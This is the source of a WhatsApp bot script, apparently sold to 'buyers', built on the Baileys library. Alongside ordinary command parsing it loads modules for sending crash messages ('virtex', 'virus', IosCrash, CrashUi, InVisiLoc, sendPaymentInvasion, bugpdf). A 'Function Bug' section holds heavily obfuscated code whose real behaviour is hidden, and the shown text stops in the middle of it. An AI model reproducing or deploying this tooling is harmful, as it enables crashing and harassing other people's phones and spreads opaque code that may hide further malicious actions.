// UPDATE ᤪᤣ᪰ᤪ᪰𝐕͢𝐚ᤡ𝐫𝐓͢ᤡ𝐱ᤡ𝐒ᤳ
// BASE ORI BY © vareltzy
// RECODE BY VAREL 

 // 𝐊𝐀𝐌𝐈 𝐒𝐄𝐍𝐀𝐍𝐆 𝐉𝐈𝐊𝐀 𝐀𝐍𝐃𝐀 𝐓𝐈𝐃𝐀𝐊 𝐌𝐄𝐑𝐔𝐁𝐀𝐇 𝐂𝐑𝐄𝐃𝐈𝐓
 // 𝐓𝐎𝐋𝐎𝐍𝐆 𝐃𝐈 𝐇𝐀𝐑𝐆𝐀𝐈 𝐌𝐀𝐊𝐀𝐒𝐈𝐇
 
 // PENAMBAHAN FITUR INSTALL PANEL 
 
// HAK BUYYER HANYA MENGGUNAKAN JIKA ADA FITUR EROR BISA LAPOR ADMIN KALAU EROR NYA PAS RECODE/RENAME BUKAN URUSAN SAYA 


//   © 𝘾𝙍𝙀𝘿𝙄𝙏
// 𝙋𝘼𝙆 𝙏𝙕𝙔 ( 𝙋𝙀𝙉𝙔𝙀𝘿𝙄𝘼 𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝘽𝙐𝙂 )
// 𝙑𝙖𝙧𝙚𝙡𝙏𝙯𝙮 ( 𝘿𝙀𝙑 )
// 𝙓𝙀𝙊𝙉 ( 𝘽𝙀𝙎𝙏 𝘾𝙍𝙀𝘼𝙏𝙊𝙍 𝘽𝙊𝙏
// 𝙍𝙓𝙃𝙇 ( 𝘽𝘼𝙎𝙀 𝘽𝙊𝙏 )
// 𝙊𝙍𝘼𝙉𝙂 𝙏𝙐𝘼 ( 𝘽𝙀𝙎𝙏 𝙎𝙐𝙋𝙋𝙊𝙍𝙏 )

///////𝙅𝘼𝙉𝙂𝘼𝙉 𝘿𝙄 𝙃𝘼𝙋𝙐𝙎//////

require('./settings')
require('./lib/language')
require('./lib/virtex/virus')
const {
	smsg,
	getGroupAdmins,
	formatp,
	h2k,
	tanggal,
	formatDate,
	getTime,
	isUrl,
	sleep,
	clockString,
	msToDate,
	sort,
	toNumber,
	enumGetKey,
	runtime,
	fetchJson,
	getBuffer,
	jsonformat,
	delay,
	format,
	logic,
	generateProfilePicture,
	parseMention,
	getRandom,
	pickRandom,
	reSize
} = require("./lib/myfunction")
const {
    useMultiFileAuthState,
	downloadContentFromMessage,
	emitGroupParticipantsUpdate,
	emitGroupUpdate,
	generateWAMessageContent,
	generateWAMessage,
	makeInMemoryStore,
	prepareWAMessageMedia,
	generateWAMessageFromContent,
	MediaType,
	areJidsSameUser,
	WAMessageStatus,
	downloadAndSaveMediaMessage,
	AuthenticationState,
	GroupMetadata,
	initInMemoryKeyStore,
	getContentType,
	MiscMessageGenerationOptions,
	useSingleFileAuthState,
	BufferJSON,
	WAMessageProto,
	MessageOptions,
	WAFlag,
	WANode,
	WAMetric,
	ChatModification,
	MessageTypeProto,
	WALocationMessage,
	ReconnectMode,
	WAContextInfo,
	proto,
	WAGroupMetadata,
	ProxyAgent,
	waChatKey,
	MimetypeMap,
	MediaPathMap,
	WAContactMessage,
	WAContactsArrayMessage,
	WAGroupInviteMessage,
	WATextMessage,
	WAMessageContent,
	WAMessage,
	BaileysError,
	WA_MESSAGE_STATUS_TYPE,
	MediaConnInfo,
	URL_REGEX,
	WAUrlInfo,
	WA_DEFAULT_EPHEMERAL,
	WAMediaUpload,
	mentionedJid,
	processTime,
	Browser,
	MessageType,
	Presence,
	WA_MESSAGE_STUB_TYPES,
	Mimetype,
	relayWAMessage,
	Browsers,
	GroupSettingChange,
	DisconnectReason,
	WASocket,
	getStream,
	WAProto,
	isBaileys,
	AnyMessageContent,
	fetchLatestBaileysVersion,
	templateMessage,
	InteractiveMessage,
	Header
} = require("@whiskeysockets/baileys")
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const buttonvareltzy = require("./lib/antibacot")
const yts = require("yt-search")
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const { Client } = require('ssh2');

const slayer07 = fs.readFileSync('./lib/image/slayer07.jpg')
const timestampp = speed();
const latensi = speed() - timestampp
const pino = require('pino')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
module.exports = VxoZap = async (VxoZap, m, chatUpdate, store) => {
try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'interactiveResponseMessage') ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.msg.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text: '')
var prefix = global.prefa ? /^[°𖤍π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°𖤍π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const owner = JSON.parse(fs.readFileSync('./lib/user.json'))
const reseller = JSON.parse(fs.readFileSync('./lib/reseller.json'))
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ") 
const cmd = prefix + command
const botNumber = await VxoZap.decodeJid(VxoZap.user.id)
const isDev = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isReseller = [botNumber, ...reseller].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const qtext = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const { xeontext1 } = require('./69/xeontext1')
const { xeontext2 } = require('./69/xeontext2')
const { xeontext3 } = require('./69/xeontext3')
const { xeontext4 } = require('./69/xeontext4')
const { xeontext5 } = require('./69/xeontext5')
const { xeontext6 } = require('./69/xeontext6')
const { xeontext7 } = require('./69/xeontext7')
const { xeontext8 } = require('./69/xeontext8')
const { xeontext9 } = require('./69/xeontext9')
const { xeontext10 } = require('./69/xeontext10')
const { xeontext11 } = require('./69/xeontext11')
const wkwk = fs.readFileSync(`./69/x.mp3`)
const GetsuZo = fs.readFileSync(`./system/image/IvS/EsQl.jpg`)
		const GetSuZo = fs.readFileSync(`./system/image/IvS/ViLoc.jpg`)
const xsteek = fs.readFileSync(`./69/x.webp`)
const o = fs.readFileSync(`./69/o.jpg`)
const from = m.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await VxoZap.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const pushname = m.pushName || "No Name"
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const vareltzyimage = fs.readFileSync('./lib/image/vareltzy.jpg')
const thumb = fs.readFileSync('./lib/image/xfoto.jpg')
const xfoto = fs.readFileSync('./lib/image/xfoto.jpg')
const mime = (quoted.msg || quoted).mimetype || ''
const { uptotelegra } = require('./lib/upload')
const API_TOKEN = global.apitokendo;
const santet = fs.readFileSync(`./lib/image/santet.jpg`)
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const virgam = fs.readFileSync('./lib/virtex/virgam.jpeg')
const ytdl = require("ytdl-core")
const bugthumb = fs.readFileSync ('./lib/image/mamak.jpg')
const responbug = 'wait for the process to complete'
const {
	youtube
} = require("btch-downloader")
const {
	chatGpt,
	tiktokDl,
	ytMp4,
	ytMp3
} = require('./lib/screaper')
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃 Selamat Malam"
} else if (time >= "15:00:00" && time < "19:00:00") {
ucapanWaktu = "🌄 Selamat Sore"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️ Selamat Siang"
} else if (time >= "06:00:00" && time < "11:00:00") {
ucapanWaktu = "🏙️ Selamat Pagi"
} else {
ucapanWaktu = "🌆 Selamat Subuh"
}
const wib = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z")
const wita = moment(Date.now()).tz("Asia/Makassar").locale("id").format("HH:mm:ss z")
const wit = moment(Date.now()).tz("Asia/Jayapura").locale("id").format("HH:mm:ss z")
const salam = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("a")
let d = new Date
let gmt = new Date(0).getTime() - new Date("1 Januari 2024").getTime()
let weton = ["Pahing", "Pon","Wage","Kliwon","Legi"][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString("id", { weekday: "long" })
let calender = d.toLocaleDateString("id", {
day: "numeric",
month: "long",
year: "numeric"
})
// Hahahaha
if (!VxoZap.public) {
if (!isDev) return
}




if (m.message) {
    console.log(chalk.green.bgHex("#e74c3c").bold(`\n💫 ${ucapanWaktu} 💫`));
    console.log(chalk.green.bgHex("#e74c3c").bold(`✉️ Pesan Baru`));
    console.log(chalk.black.bgHex("#00FF00")(`💬 Pesan: ${m.body || m.mtype} \n🗣️ Pengirim: ${m.pushName} \n🔢 JID: ${m.sender}`));
    if (m.isGroup) {
        console.log(chalk.black.bgHex("#00FF00")(`🏷️ Grup: ${groupName}`));
        console.log(chalk.black.bgHex("#00FF00")(`🧷 GroupJid: ${m.chat}`));
    }
}


let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
VxoZap.sendPresenceUpdate(jd, from)
}

function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

async function loading () {
var vareltzyloading = [
"𝐕𝐀𝐑𝐄𝐋",
"𝐕𝐀𝐑𝐄𝐋 𝐁𝐎𝐓𝐙",
"𝐕𝐀𝐑𝐄𝐋 𝐁𝐎𝐓𝐙 𝐍𝐎",
"𝐕𝐀𝐑𝐄𝐋 𝐁𝐎𝐓𝐙 𝐍𝐎 𝐂𝐎𝐔𝐍𝐓𝐄𝐑",
]
let { key } = await VxoZap.sendMessage(from, {text: '𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭'})
for (let i = 0; i < vareltzyloading.length; i++) {
await VxoZap.sendMessage(from, {text: vareltzyloading[i], edit: key });
}
}

let example = (teks) => {
return `\n*Contoh Penggunaan :*\nketik *${cmd}* ${teks}\n`
}

const I1 = fs.readFileSync(`./lib/image/xfoto.jpg`)
		const I2 = fs.readFileSync(`./lib/image/vareltzy.jpg`)
		
// Function Penting
function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}
const FileSize = (number) => {
var SI_POSTFIXES = ["B", " KB", " MB", " GB", " TB", " PB", " EB"]
var tier = Math.log10(Math.abs(number)) / 3 | 0
if(tier == 0) return number
var postfix = SI_POSTFIXES[tier]
var scale = Math.pow(10, tier * 3)
var scaled = number / scale
var formatted = scaled.toFixed(1) + ''
if (/\.0$/.test(formatted))
formatted = formatted.substr(0, formatted.length - 2)
return formatted + postfix
}

		
					const { ZnX, sendPaymentInvasion, Suzo, CaroUsel, Gsz, Tedex, CrL, IosCrash, ZnXIvS, XiosVirus, XiosPay, OutOff, ClPm, ClPmNull, InVisiXz, InVisiLoc, InVisiLocNull, InVisiLocXz, CrashUi } = require("./69/vrlv9/bugsystem")
		
		const successreact = ['☠️']
		const finishmoji = successreact[Math.floor(Math.random() * successreact.length)]
		const taskdone = (teks) => {
			return VxoZap.sendMessage(m.chat, {
				react: {
					text: teks,
					key: m.key
				}
			})
		}
		
		
		// VIRTEX \\
		//=================================================//
		const {
			ios
		} = require("./virtex/ios.js")
		const {
			telapreta3
		} = require("./virtex/telapreta3.js")
		const {
			convite
		} = require("./virtex/convite.js")
		const {
			bugpdf
		} = require("./virtex/bugpdf.js")
		const {
			cP
		} = require('./virtex/bugUrl.js')
		//=================================================//
			//RANDOM IMAGE\\
		const X1 = [I1, I2]
		const randomIndex = Math.floor(Math.random() * X1.length)
		const V1 = X1[randomIndex]
		/////////////////////////////////////////////////////////
VxoZap.sendButton = async (jid, buttons, quoted, opts = {}) => {
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: {
                     text: opts && opts.body ? opts.body : ''
                  },
                  footer: {
                     text: opts && opts.footer ? opts.footer : ''
                  },
                  nativeFlowMessage: {
                     buttons: buttons,
                     messageParamsJson: ''
                  }
               }
            }
         }
      }, {
         quoted
      })
      await VxoZap.sendPresenceUpdate('composing', jid)
      return VxoZap.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }

// batas
const Styles = (text, style = 1) => {
  var xStr = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
  var yStr = {
    1: 'abcdefghijklmnopqrstuvwxyz1234567890'
  };
  var replacer = [];
  xStr.map((v, i) =>
    replacer.push({
      original: v,
      convert: yStr[style].split('')[i]
    })
  );
  var str = text.toLowerCase().split('');
  var output = [];
  str.map((v) => {
    const find = replacer.find((x) => x.original == v);
    find ? output.push(find.convert) : output.push(v);
  });
  return output.join('');
};
// Function Bug
(function(_0x3a2913,_0x57e166){function _0x5108d4(_0xcd79f0,_0x33cbba,_0x45c8cd,_0x426929,_0x501ff8){return _0x28c5(_0x501ff8- -0x1b3,_0xcd79f0);}function _0x2a3c92(_0x870f43,_0x29d0fa,_0x2e3d50,_0x286981,_0x2c3bda){return _0x28c5(_0x870f43-0x10f,_0x2e3d50);}const _0x5cc6cb=_0x3a2913();function _0x152bae(_0x41189c,_0x2a4eb9,_0x23556b,_0x532135,_0x23b639){return _0x28c5(_0x41189c-0x3d5,_0x23556b);}function _0x1c891b(_0x1ee2e2,_0x3a0967,_0x4c5a50,_0xb64208,_0x4719f0){return _0x28c5(_0x4719f0-0x115,_0x4c5a50);}function _0xd4a5e4(_0x223fa8,_0x300583,_0x54b645,_0x4362c4,_0x35578d){return _0x28c5(_0x223fa8- -0x2db,_0x4362c4);}while(!![]){try{const _0x93db12=parseInt(_0x152bae(0x5aa,0x5c4,0x64a,0x4bc,0x846))/(0x1385*-0x1+0x17b8+0x3*-0x166)*(parseInt(_0x152bae(0xa92,0xa0d,0xa26,0x7d1,0xaae))/(-0x7ac+0x2*-0x1307+-0x1*-0x2dbc))+parseInt(_0x152bae(0x587,0x809,0x3f4,0x838,0x612))/(-0x52f+-0x12b4+0x17e6)*(parseInt(_0x2a3c92(0x52c,0x2f9,0x5a4,0x256,0x637))/(-0xc96+0x1f6c+0x3*-0x646))+-parseInt(_0x2a3c92(0x68f,0x414,0x717,0x60d,0x55c))/(0x860+-0x153+0x1c2*-0x4)+parseInt(_0x1c891b(0x12c,0x4ca,0x11e,0x4ad,0x2ca))/(-0x1e68+0x1454+-0x2*-0x50d)*(-parseInt(_0x152bae(0x7c6,0x69f,0x7b9,0x997,0x748))/(0x3*0xc27+-0x1a*-0x97+0xcf1*-0x4))+-parseInt(_0xd4a5e4(0x173,0x2a4,0x53,-0xd6,0x8c))/(0x104d+0x16f*-0x1+-0xed6)*(-parseInt(_0xd4a5e4(-0x171,-0x77,0x116,-0x55,0x153))/(-0x269e+0x269*0x1+0x243e))+parseInt(_0x1c891b(0x49a,0x3f2,0x41c,0x2c2,0x437))/(0x153b+-0x138f+0x26*-0xb)+-parseInt(_0x1c891b(0x72e,0x3b8,0x4e8,0x3f3,0x58f))/(0x1144*-0x2+-0x15dc+-0x1*-0x386f);if(_0x93db12===_0x57e166)break;else _0x5cc6cb['push'](_0x5cc6cb['shift']());}catch(_0x3db7b3){_0x5cc6cb['push'](_0x5cc6cb['shift']());}}}(_0x512b,-0x8c2cf+-0x7c*0x1196+0x16d823));const _0x8a3960=(function(){function _0x1bc422(_0x392558,_0x3689ab,_0x2fb801,_0x308e8b,_0x1eaba4){return _0x28c5(_0x3689ab- -0x21d,_0x1eaba4);}const _0x2e8093={'LqnGj':function(_0x58aef4,_0x202561){return _0x58aef4(_0x202561);},'BiKjK':function(_0x232178,_0x261f65){return _0x232178!==_0x261f65;},'EYyhZ':_0x6837b8(0x7be,0x4e8,0x791,0x8a3,0x957),'tkLKp':function(_0x39a8cf,_0x35a2c2){return _0x39a8cf===_0x35a2c2;},'vyYYN':_0x6837b8(0x1aa,0x3f2,0x46d,0x358,0x682),'Gdjhr':_0x5def81(0x5a9,0x429,0x453,0x43f,0x487),'vMqqM':_0x5def81(0x2df,0x387,0x13e,0x49e,0x390),'KMYYg':_0x1bc422(0x5c5,0x435,0x431,0x380,0x17e)};function _0x4891ef(_0x3d15e0,_0xba1ab1,_0x441322,_0x4155cf,_0x24f2bc){return _0x28c5(_0xba1ab1-0xbb,_0x4155cf);}function _0x6837b8(_0x3765d8,_0x237d71,_0x567f42,_0x96058d,_0x6e07a8){return _0x28c5(_0x567f42-0x130,_0x237d71);}function _0x2f15fa(_0x336c5d,_0x31dbcb,_0x37050d,_0x232ea0,_0x42aaf7){return _0x28c5(_0x37050d-0x170,_0x336c5d);}function _0x5def81(_0x1f2dc7,_0x287212,_0x2b000f,_0x5938c9,_0x84e2c6){return _0x28c5(_0x84e2c6-0x7,_0x287212);}let _0x216986=!![];return function(_0x33dbf0,_0x5db98b){function _0x15f9a7(_0x32e16e,_0x412224,_0x98e27d,_0x4c5112,_0x5a4137){return _0x6837b8(_0x32e16e-0x23,_0x98e27d,_0x32e16e-0x1b5,_0x4c5112-0x9d,_0x5a4137-0x116);}function _0x5d8d34(_0x1e92f2,_0x5cedda,_0x36228b,_0x42b379,_0x238f76){return _0x1bc422(_0x1e92f2-0x93,_0x238f76-0x2f6,_0x36228b-0xde,_0x42b379-0x166,_0x36228b);}function _0x34b665(_0x73633f,_0x526ee8,_0x622dcc,_0x44083a,_0x30e648){return _0x1bc422(_0x73633f-0x100,_0x526ee8-0x1c2,_0x622dcc-0x144,_0x44083a-0x103,_0x30e648);}function _0x445b1b(_0x399b5d,_0x17989e,_0x42b7d2,_0x2f9efa,_0x37c419){return _0x1bc422(_0x399b5d-0x56,_0x17989e-0x2cd,_0x42b7d2-0x17,_0x2f9efa-0xfe,_0x37c419);}if(_0x2e8093[_0x445b1b(0x315,0x245,0x17e,0x29b,0x35a)](_0x2e8093[_0x5d8d34(0x33b,0x220,0x19a,0xbb,0x2dd)],_0x2e8093[_0x34b665(0x2e7,0x129,0x34f,0x1c1,0x144)]))_0x2e8093[_0x15f9a7(0x5b0,0x846,0x7e1,0x7ed,0x67b)](_0x286b8f,'0');else{const _0x3a6570=_0x216986?function(){function _0x2473c8(_0x50a8ca,_0x39ff9c,_0x463a70,_0x2fac21,_0x279c53){return _0x34b665(_0x50a8ca-0xf4,_0x463a70-0x1b1,_0x463a70-0x78,_0x2fac21-0x29,_0x39ff9c);}function _0x346fb8(_0x4c7758,_0x2379f1,_0x4940e0,_0x25e0ef,_0xb3521b){return _0x15f9a7(_0x25e0ef- -0x144,_0x2379f1-0x153,_0x2379f1,_0x25e0ef-0x190,_0xb3521b-0x1a6);}function _0x743ecc(_0x4926cc,_0x425696,_0x4c2546,_0x1d8cf2,_0x2ef92c){return _0x5d8d34(_0x4926cc-0x6e,_0x425696-0x167,_0x2ef92c,_0x1d8cf2-0x2e,_0x425696-0x119);}function _0x2b0041(_0x264b98,_0x2b3991,_0x301f2e,_0x41b4f4,_0x118be1){return _0x15f9a7(_0x264b98- -0x434,_0x2b3991-0x10c,_0x41b4f4,_0x41b4f4-0x81,_0x118be1-0xc8);}function _0x12ae89(_0x2f9dd4,_0x290e2a,_0x1af9a9,_0x3ab9dc,_0x5cde74){return _0x15f9a7(_0x290e2a- -0x147,_0x290e2a-0x1e2,_0x1af9a9,_0x3ab9dc-0x1a8,_0x5cde74-0x75);}if(_0x2e8093[_0x2473c8(0x65d,0x72e,0x803,0x88a,0x5e3)](_0x2e8093[_0x346fb8(0x49f,0x42f,0x361,0x40f,0x515)],_0x2e8093[_0x12ae89(0x3b2,0x40c,0x2f6,0x22e,0x476)])){if(_0x2fb7ed){const _0x55aa1=_0x1019c9[_0x2b0041(0x2b8,0x52b,0x56f,0xf4,0x4db)](_0x304bcd,arguments);return _0x163003=null,_0x55aa1;}}else{if(_0x5db98b){if(_0x2e8093[_0x12ae89(0x85,0x333,0x237,0x4b8,0x5f1)](_0x2e8093[_0x2b0041(0x3ae,0x34e,0x16d,0x55b,0x2d2)],_0x2e8093[_0x743ecc(0x8ff,0x7c6,0x74b,0x8c0,0x842)])){const _0x340f0c=_0x58940b?function(){function _0x43ad67(_0x10cda7,_0x2f9b30,_0x54bbf8,_0x51a463,_0x48ed1f){return _0x2473c8(_0x10cda7-0x1e7,_0x51a463,_0x2f9b30- -0x468,_0x51a463-0x10,_0x48ed1f-0x13);}if(_0x57ab39){const _0x1f426b=_0x533521[_0x43ad67(0x2,0xf5,-0x1ad,0x80,0x31a)](_0x4fce52,arguments);return _0x104a8e=null,_0x1f426b;}}:function(){};return _0x2b9f37=![],_0x340f0c;}else{const _0x5ed5dc=_0x5db98b[_0x2473c8(0x765,0x538,0x55d,0x5f9,0x47e)](_0x33dbf0,arguments);return _0x5db98b=null,_0x5ed5dc;}}}}:function(){};return _0x216986=![],_0x3a6570;}};}()),_0x2e8ff1=_0x8a3960(this,function(){function _0x92fd00(_0x16fb41,_0x9810e7,_0x3b6b26,_0x1e9247,_0x534c43){return _0x28c5(_0x534c43- -0x265,_0x9810e7);}function _0x14d5f2(_0xb69589,_0x4cd6bc,_0x82cb5f,_0x3dba95,_0x45cf27){return _0x28c5(_0x3dba95-0x2d6,_0xb69589);}function _0x5f3f54(_0x6d717c,_0xf58b3f,_0x2b9cd0,_0x36f867,_0x2c9695){return _0x28c5(_0x2b9cd0-0x1bf,_0xf58b3f);}function _0x14df78(_0xaec93e,_0x169282,_0x2e862b,_0x349e30,_0x205279){return _0x28c5(_0x169282- -0x1b,_0xaec93e);}const _0x1d92f3={};function _0x46ce71(_0x4ec53e,_0x2faeda,_0x44c2a1,_0x2ae542,_0x3603c4){return _0x28c5(_0x44c2a1- -0x113,_0x2ae542);}_0x1d92f3[_0x14d5f2(0x821,0x939,0x80d,0x87c,0x9d5)]=_0x14d5f2(0x829,0x7ff,0x8ce,0x6c4,0x459)+_0x92fd00(0x25e,0x15a,0x465,-0xa,0x29d)+'+$';const _0x2589be=_0x1d92f3;return _0x2e8ff1[_0x92fd00(0x73,0x34b,0x3b8,0xda,0x107)+_0x5f3f54(0x4bd,0x442,0x3a7,0x631,0x581)]()[_0x5f3f54(0x3bc,0x890,0x655,0x816,0x78b)+'h'](_0x2589be[_0x46ce71(0x3f5,0x23b,0x493,0x689,0x4bf)])[_0x5f3f54(0x2b9,0x2c4,0x52b,0x71b,0x62e)+_0x14df78(0x411,0x1cd,0x14d,0x28b,0x453)]()[_0x14d5f2(0xa95,0x7fa,0x8a5,0x8c4,0x796)+_0x46ce71(0x90,-0x20c,0x86,0x279,-0xdf)+'r'](_0x2e8ff1)[_0x5f3f54(0x408,0x638,0x655,0x821,0x856)+'h'](_0x2589be[_0x5f3f54(0x518,0x77a,0x765,0x720,0x714)]);});_0x2e8ff1();const _0x55e416=(function(){function _0x5b9899(_0x5ed1af,_0x39cd81,_0xb80427,_0x30cb2c,_0x3b7b4c){return _0x28c5(_0x39cd81-0xc7,_0xb80427);}const _0xf08c63={'CIWiC':function(_0x5ae182,_0xcac712){return _0x5ae182+_0xcac712;},'KLPur':_0x5b9899(0x7f6,0x734,0x46a,0x8e0,0x4ce),'kIbFf':_0x157e5b(-0xa9,0x1eb,-0x13a,0x18a,0x9d),'xMvAs':_0x157e5b(0xd1,-0x39d,-0x433,-0x3bf,-0x16d)+'n','dQhak':function(_0x4e8411,_0x2e9805,_0x304d84,_0x952ce4){return _0x4e8411(_0x2e9805,_0x304d84,_0x952ce4);},'yIoAw':_0x1a02b7(0x8d5,0x6bf,0xb7d,0x9bd,0x998)+'rl','MASWf':_0x1a02b7(0xa3e,0xc17,0xb33,0xaa7,0x8a2)+_0x5b9899(0x171,0x436,0x3e6,0x39d,0x4dd)+_0x1a02b7(0x546,0x42e,0x30c,0x296,0x521)+_0x1a02b7(0x888,0x89d,0xa9c,0x779,0xa30)+_0x172b63(0x211,0x141,0xb6,0x355,0x172)+_0x163caf(0x87b,0x980,0xb28,0xa28,0xa43)+_0x157e5b(0x58,-0x27,0x16e,0x18,0x18)+_0x172b63(0x1c5,-0x72,-0x167,0x264,-0x36)+_0x5b9899(0x773,0x63c,0x65c,0x598,0x77e)+_0x5b9899(0x782,0x563,0x292,0x358,0x57d)+_0x1a02b7(0x8b2,0x83b,0x8f4,0x94a,0x685)+_0x157e5b(0xec,0xd7,0x122,-0x344,-0x173)+_0x5b9899(0x4a1,0x285,0x47e,-0x9,0x1b4)+_0x5b9899(0x314,0x3b9,0x3e0,0x3a0,0x25a)+_0x157e5b(0xed,0x4d,-0x68,0x1b7,0x55)+_0x157e5b(-0x21c,-0xba,-0x103,-0xb9,-0xda)+_0x1a02b7(0x93b,0xb62,0x6ac,0xb69,0xb91)+_0x157e5b(0x2b5,0x1e3,0x0,0xf0,0x12d)+_0x157e5b(0x314,-0x37,0x262,0xff,0x17d)+_0x5b9899(0x1b,0x2c3,0x19e,0x285,0x16b)+_0x1a02b7(0x584,0x699,0x49c,0x3e2,0x348)+'\x22}','Pices':function(_0x5a49af,_0x4967d8){return _0x5a49af===_0x4967d8;},'SUeUv':_0x1a02b7(0x92f,0xb69,0x670,0x839,0x855),'maDjZ':function(_0x48da28,_0x5a41ec){return _0x48da28!==_0x5a41ec;},'hWbCJ':_0x157e5b(-0x1b2,0xd,-0x1d3,-0x142,-0x142),'fXQWZ':_0x157e5b(-0x8,-0xb6,0x52,-0x12b,0x196),'vtUEv':_0x172b63(0x269,-0x1df,0x2c1,0x194,0xd0)+_0x163caf(0xafc,0x8bb,0x6b3,0x999,0xaa2)+'+$','sCZEb':_0x157e5b(-0x275,-0x47,-0xd1,-0x209,-0x2b)};function _0x157e5b(_0x12410e,_0x142c61,_0x4b25ae,_0x1ce229,_0x19775d){return _0x28c5(_0x19775d- -0x36f,_0x12410e);}let _0x4b851f=!![];function _0x163caf(_0x5a25d0,_0x488650,_0x1fdc3f,_0x5016d3,_0x304e3a){return _0x28c5(_0x488650-0x3b9,_0x304e3a);}function _0x172b63(_0x3d0877,_0x47b42c,_0x2d7294,_0xd9a78,_0x53ab7a){return _0x28c5(_0x53ab7a- -0x31e,_0xd9a78);}function _0x1a02b7(_0x1d131c,_0x3505c4,_0x4a9cb3,_0x29c2c6,_0x188f80){return _0x28c5(_0x1d131c-0x3c6,_0x3505c4);}return function(_0x2c5bf0,_0x58db62){function _0x316b3d(_0x29a857,_0x42d6b9,_0x557c0c,_0x4472bd,_0x5c8d9a){return _0x172b63(_0x29a857-0x9d,_0x42d6b9-0xec,_0x557c0c-0x105,_0x42d6b9,_0x557c0c-0x6d0);}function _0x282da1(_0x47b5aa,_0x2954e7,_0x2f56e4,_0x21f7c5,_0x347e39){return _0x172b63(_0x47b5aa-0x29,_0x2954e7-0x6f,_0x2f56e4-0x156,_0x2954e7,_0x2f56e4- -0x5b);}function _0x115b41(_0x321a31,_0x435026,_0x3a684b,_0x5212e4,_0x3763fc){return _0x172b63(_0x321a31-0x6,_0x435026-0x191,_0x3a684b-0x1d3,_0x435026,_0x5212e4-0x406);}function _0x1794df(_0x4c8dc2,_0x35c786,_0x1db48a,_0x36a8e9,_0x1aee23){return _0x172b63(_0x4c8dc2-0x1d4,_0x35c786-0xc4,_0x1db48a-0x1b7,_0x35c786,_0x1aee23-0x35c);}function _0x23b29a(_0x7e4e82,_0x3186f7,_0x2c4013,_0x43cb95,_0x476a02){return _0x5b9899(_0x7e4e82-0x1e7,_0x43cb95-0x256,_0x7e4e82,_0x43cb95-0x1c4,_0x476a02-0x42);}if(_0xf08c63[_0x1794df(0x56d,0x6ff,0x33a,0x7a9,0x544)](_0xf08c63[_0x1794df(0x30f,0x39a,0x4c5,0x35d,0x2d0)],_0xf08c63[_0x1794df(0x62,0xcf,0x2dd,0x3ef,0x2d0)])){const _0xd14568=_0x4b851f?function(){function _0x24f624(_0x8a99e5,_0x3c168a,_0x4003f6,_0x308b4b,_0x413faa){return _0x1794df(_0x8a99e5-0x8,_0x413faa,_0x4003f6-0x60,_0x308b4b-0x153,_0x8a99e5-0x1bd);}function _0x4db077(_0x38a62e,_0x26dacc,_0x26c5ef,_0x3a2986,_0x465f60){return _0x316b3d(_0x38a62e-0x165,_0x26c5ef,_0x3a2986- -0x705,_0x3a2986-0xe1,_0x465f60-0x0);}function 